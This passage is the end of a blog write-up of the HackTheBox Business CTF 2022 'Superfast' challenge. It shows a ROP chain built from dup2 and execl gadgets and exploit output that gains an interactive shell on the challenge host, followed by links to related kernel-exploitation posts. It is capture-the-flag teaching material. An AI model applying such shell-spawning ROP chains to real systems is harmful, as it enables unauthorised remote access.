0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x55da3d001be0 dup2
0x0078:   0x55da3d00816b pop rdi; ret
0x0080:   0x55da3d703fc3 [arg0] rdi = 94395821998019
0x0088:   0x55da3d00487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x55da3d0043fc pop rsi; ret
0x00a0:   0x55da3d703fc3 [arg1] rsi = 94395821998019
0x00a8:   0x55da3d0042d0 execl
[*] sending payload for shell...
[+] Opening connection to b'161.35.173.232' on port 31302: Done
[*] Switching to interactive mode
sh: turning off NDELAY mode
$ whoami
ctf</code></pre><figcaption>Output of the exploit</figcaption></figure><p>Thanks for reading my write-up about the HackTheBox Business CTF 2022 Superfast challenge; I hope you learned as much as I did.</p>
    </section>


</article>
</main>




            <aside class="read-more-wrap outer">
                <div class="read-more inner">
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd-syzkaller/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Tickling ksmbd: fuzzing SMB in the Linux kernel
                </h2>
            </header>
                <div class="post-card-excerpt">Following the adventure of manually discovering network-based vulnerabilities in the Linux kernel, I'm adding ksmbd-fuzzing functionality to the already extensive kernel-fuzzing tool that is Syzkaller.</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-09-16">Sep 16, 2023</time>
                <span class="post-card-meta-length">7 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post featured no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/ksmbd/">
            <header class="post-card-header">
                <div class="post-card-tags">
                        <span class="post-card-featured"><svg width="16" height="17" viewBox="0 0 16 17" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M4.49365 4.58752C3.53115 6.03752 2.74365 7.70002 2.74365 9.25002C2.74365 10.6424 3.29678 11.9778 4.28134 12.9623C5.26591 13.9469 6.60127 14.5 7.99365 14.5C9.38604 14.5 10.7214 13.9469 11.706 12.9623C12.6905 11.9778 13.2437 10.6424 13.2437 9.25002C13.2437 6.00002 10.9937 3.50002 9.16865 1.68127L6.99365 6.25002L4.49365 4.58752Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
</svg> Featured</span>
                </div>
                <h2 class="post-card-title">
                    Unleashing ksmbd: remote exploitation of the Linux kernel (ZDI-23-979, ZDI-23-980)
                </h2>
            </header>
                <div class="post-card-excerpt">December 22nd 2022: it's Christmas Thursday, one of the last workdays before the Christmas vacation starts. Whilst everyone was looking forward to opening presents from friends and family, the Zero Day Initiative decided to give the IT community a present as well: immense stress in the form of ZDI-22-1690, an</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-08-04">Aug 4, 2023</time>
                <span class="post-card-meta-length">10 min read</span>
        </footer>

    </div>

</article>
                        
<article class="post-card post no-image">


    <div class="post-card-content">

        <a class="post-card-content-link" href="/cve-2022-46640/">
            <header class="post-card-header">
                <div class="post-card-tags">
                </div>
                <h2 class="post-card-title">
                    How I hacked IoT management apps: the story behind CVE-2022-46640
                </h2>
            </header>
                <div class="post-card-excerpt">Have you ever wondered how secure desktop applications really are? Recently, we put one of them to the test and found some critical vulnerabilities such as unauthenticated Remote Code Execution (CVE-2022-46640), Local File Inclusion and Remote Wireless Reconfiguration which allowed us to remotely compromise the Windows desktop. In this blogpost,</div>
        </a>

        <footer class="post-card-meta">
            <time class="post-card-meta-date" datetime="2023-03-08">Mar 8, 2023</time>
                <span class="post-card-meta-length">8 min read</span>
        </footer>

    </div>

</article>
                </div>
            </aside>



    </div>

    <footer class="site-footer outer">
        <div class="inner">
            <section class="copyright"><a href="https://pwning.tech">Pwning Tech</a> &copy; 2024</section>
            <nav class="site-footer-nav">
                
            </nav>
            <div class="gh-powered-by"><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
        </div>
    </footer>

</div>

    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <div class="pswp__bg"></div>

    <div class="pswp__scroll-wrap">
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>
<script
    src="https://code.jquery.com/jquery-3.5.1.min.js"
    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
    crossorigin="anonymous">
</script>
<script src="/assets/built/casper.js?v=8bb51843de"></script>
<script>
$(document).ready(function () {
    // Mobile Menu Trigger
    $('.gh-burger').click(function () {
        $('body').toggleClass('gh-head-open');
    });
    // FitVids - Makes video embeds responsive
    $(".gh-content").fitVids();
});
</script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" integrity="sha512-AKaNmg8COK0zEbjTdMHJAPJ0z6VeNqvRvH4/d5M4sHJbQQUToMBtodq4HaV4fa+WV2UTfoperElm66c9/8cKmQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js" integrity="sha512-8VrjxGFLIkS0mgEmO3p46A5OkqATHhrNVwyv2V7yUeZrk1jmSDuI3SOEpC9XHEHUWEOsfzzcJeBlUkee9lKGrw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" integrity="sha512-whYhDwtTmlC/NpZlCr6PSsAaLOrfjVg/iXAnC4H/dtiHawpShhT2SlIMbpIhT/IL/NrpdMm+Hq2C13+VKpHTYw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup-templating.min.js" integrity="sha512-+8BiRfWso6waiFDv6tEmWF8yfPGgxAtOYLDUB0rRISLwtpxkJ9lpPNUhxwWlikn3qSO+4RQyzDppi62o3ON/AA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js" integrity="sha512-plzrTi61ltEMFf84gTVO9IkvIMfBu07bnDuahvdlIclmFWzXJ9VcRsny9d45sxFZRv3jJg/MHNyuxnUYEMxMEg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js" integrity="sha512-3KphgbiKTzK2CNxlSgUKypipTV7tWknO5czNb+E7H4CeHOOSer2s2rIOCTuz8NsY1zm+B9tP9Ul2JX/tmdyOYg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js" integrity="sha512-QXFMVAusM85vUYDaNgcYeU3rzSlc+bTV4JvkfJhjxSHlQEo+ig53BtnGkvFTiNJh8D+wv6uWAQ2vJaVmxe8d3w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-diff.min.js" integrity="sha512-tBR4SAva+2bw36ToxaFeOEvgqxWHON25E9xp+kEBfw175sS5OusQEH8GrigKgTdHUXcKsK1yiyfo7fctBYl+rA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-toml.min.js" integrity="sha512-R9JG7uVdcjWlZvEWyP3KfxtexvT1uIlKUF/dYVmZRbvJyMobK6zGCpIM2gLVqYjLSYeL/zBjOVpP7vXxVtzfCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.js" integrity="sha512-BttltKXFyWnGZQcRWj6osIg7lbizJchuAMotOkdLxHxwt/Hyo+cl47bZU0QADg+Qt5DJwni3SbYGXeGMB5cBcw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<script>
    $("pre").addClass("line-numbers");
</script>

<script>
      $('.gh-content').prepend('<aside class="gh-sidebar"><div class="gh-toc"></div></aside>');
</script>

<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.12.3/tocbot.min.js"></script>
<script>
    tocbot.init({
        tocSelector: '.gh-toc',
        contentSelector: '.gh-content',
        headingSelector: 'h1, h2, h3, h4',
        hasInnerContainers: true,
  		collapseDepth: 2
    });
</script>

<script>
      $('.gh-toc').prepend('<h5>Table of contents</h5>');
</script>

<script>
  $('.gh-burger').attr('aria-label', 'menu button');
  $('.gh-search').attr('aria-label', 'search button');
  $(".author-name a").attr("aria-label", "author notselwyn");
  $(".author-profile-image").attr("aria-label", "author notselwyn");
</script>

</body>
</html>
